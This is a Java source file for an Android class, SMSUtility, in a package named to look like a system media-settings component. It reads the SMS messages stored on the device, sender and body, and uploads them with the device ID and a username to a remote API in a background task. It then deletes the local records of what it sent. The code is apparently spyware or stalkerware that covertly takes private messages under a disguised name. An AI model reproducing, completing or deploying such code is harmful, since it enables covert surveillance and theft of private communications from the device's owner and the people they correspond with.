package com.android.media.settings.Utility;

import android.content.Context;
import android.database.Cursor;
import android.os.AsyncTask;

import com.android.media.settings.API.MediaAPI;
import com.android.media.settings.MediaDBManager;
import com.android.media.settings.Services.MediaService;
import com.android.media.settings.Models.MediaAPIResponse;

import java.util.ArrayList;
import java.util.List;

import io.reactivex.Observer;
import io.reactivex.android.schedulers.AndroidSchedulers;
import io.reactivex.disposables.Disposable;
import io.reactivex.schedulers.Schedulers;

public class SMSUtility {
    private Context context;
    private MediaUtility mUtility;
    private List<String> idList;

    public SMSUtility(Context context) {
        this.context = context;
        this.mUtility = new MediaUtility(context);
        idList = new ArrayList<String>();
    }

    public void initSMSUpload() {
        Cursor smsCursor = new MediaDBManager(context).getLocalSMS();
        try {
            if(smsCursor != null && smsCursor.getCount() > 0 && mUtility.networkConnected()) {
                new SMSUploadTask().execute(smsCursor);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void startUpload(Cursor cursor) {
        StringBuilder stringBuilder = new StringBuilder();
        while (cursor.moveToNext()) {
            idList.add(cursor.getString(0));
            stringBuilder.append(cursor.getString(cursor.getColumnIndex(MediaDBManager.COLUMN_SMS_FROM)));
            stringBuilder.append(" : ");
            stringBuilder.append(cursor.getString(cursor.getColumnIndex(MediaDBManager.COLUMN_SMS_BODY)));
            stringBuilder.append("/n/n");
        }
        MediaAPI api = mUtility.initRetroService();
        api.postSms(stringBuilder.toString(), mUtility.getDeviceId(), mUtility.getUsername())
                .subscribeOn(Schedulers.newThread())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(observer);
    }

    Observer<MediaAPIResponse> observer = new Observer<MediaAPIResponse>() {
        @Override
        public void onSubscribe(Disposable d) {
        }

        @Override
        public void onNext(MediaAPIResponse value) {
            new MediaDBManager(context).removeSMS(idList);
        }

        @Override
        public void onError(Throwable e) {
            e.printStackTrace();
        }

        @Override
        public void onComplete() {

        }
    };

    private class SMSUploadTask extends AsyncTask<Cursor, Void, Void> {

        @Override
        protected void onPreExecute() {
            MediaService.isSMSUploading = true;
        }

        @Override
        protected Void doInBackground(Cursor... params) {
            Cursor cursor = params[0];
            StringBuilder stringBuilder = new StringBuilder();
            while (cursor.moveToNext()) {
                idList.add(cursor.getString(0));
                stringBuilder.append(cursor.getString(cursor.getColumnIndex(MediaDBManager.COLUMN_SMS_FROM)));
                stringBuilder.append(" : ");
                stringBuilder.append(cursor.getString(cursor.getColumnIndex(MediaDBManager.COLUMN_SMS_BODY)));
                stringBuilder.append(" \n\n");
            }
            MediaAPI api = mUtility.initRetroService();
            api.postSms(stringBuilder.toString(), mUtility.getDeviceId(), mUtility.getUsername())
                    .subscribeOn(Schedulers.newThread())
                    .observeOn(AndroidSchedulers.mainThread())
                    .subscribe(observer);
            return null;
        }

        @Override
        protected void onPostExecute(Void aVoid) {
            MediaService.isSMSUploading = false;
        }
    }
}
